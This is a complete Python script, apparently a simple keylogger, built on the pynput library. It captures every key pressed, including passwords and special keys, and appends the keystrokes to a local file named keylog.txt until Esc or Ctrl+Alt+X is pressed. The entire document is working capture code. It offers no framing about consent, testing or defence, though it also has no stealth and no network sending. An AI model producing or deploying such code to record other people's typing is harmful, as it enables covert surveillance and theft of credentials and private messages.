from pynput import keyboard

log_file = "keylog.txt"
buffer = []
buffer_size = 50  


ctrl_pressed = False
alt_pressed = False

def flush_buffer():
    if buffer:
        with open(log_file, "a") as f:
            f.write("".join(buffer))
        buffer.clear()

def on_press(key):
    global ctrl_pressed, alt_pressed

    # Track if Ctrl or Alt is pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = True
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_pressed = True

    
    if ctrl_pressed and alt_pressed and key == keyboard.KeyCode.from_char('x'):
        flush_buffer()  # Write remaining buffer to file
        return False  # Stop the listener

    if hasattr(key, 'char') and key.char is not None:
        buffer.append(key.char) 
    else:
       
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t"
        }
        buffer.append(special_keys.get(key, f"[{key.name}]"))

    if len(buffer) >= buffer_size:
        flush_buffer()

def on_release(key):
    global ctrl_pressed, alt_pressed
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_pressed = False

    if key == keyboard.Key.esc:
        flush_buffer()  
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
